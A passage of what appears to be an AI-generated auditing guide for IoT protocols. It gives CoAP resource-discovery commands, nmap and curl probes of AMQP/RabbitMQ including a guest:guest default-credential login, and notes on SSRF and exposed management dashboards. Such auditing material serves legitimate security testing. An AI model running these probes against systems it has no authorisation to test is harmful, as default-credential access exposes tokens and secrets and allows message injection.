# Query .well-known/core using Python aiocoap-client (works on Ubuntu & Termux)
aiocoap-client coap://<target>:5683/.well-known/core

# Query using libcoap coap-client (Ubuntu)
coap-client -m get coap://<target>:5683/.well-known/core
Use code with caution.
• Web Bugs Found:
	• HTTP-to-CoAP Proxy SSRF: Web gateways that translate incoming HTTP REST requests into backend CoAP UDP packets without validating target URIs, allowing attackers to scan or control internal constrained devices.

3. AMQP (Port 5672)

• How it is audited (Ubuntu & Termux):
	• Default Credentials & Management UI Checks: Testing for default guest:guest credentials on port 5672 and checking for exposed RabbitMQ HTTP management plugins on port 15672.
	• Additional Auditing Commands:bash
# Enumerate AMQP server properties and authentication mechanisms via Nmap
nmap -sT -sV -p 5672 --script amqp-info <target>

# Probe the RabbitMQ Web Management API on port 15672 using default credentials
curl -i -u guest:guest http://<target>:15672/api/overview
Use code with caution.
• Web Bugs Found:
	• Exposed RabbitMQ Web Management Dashboard (15672): Finding an internet-facing RabbitMQ web UI with default or weak credentials grants full visibility into queued web application background jobs (password reset tokens, payment webhooks, internal API secrets) and often allows arbitrary message injection.

<FollowUp>
Would you like me to:
* Export this master guide as a downloadable **`.md` file**
* Provide a **one-command setup script** to install these auditing tools on **Ubuntu and Termux**

Let me know what would be most useful next!
</FollowUp>
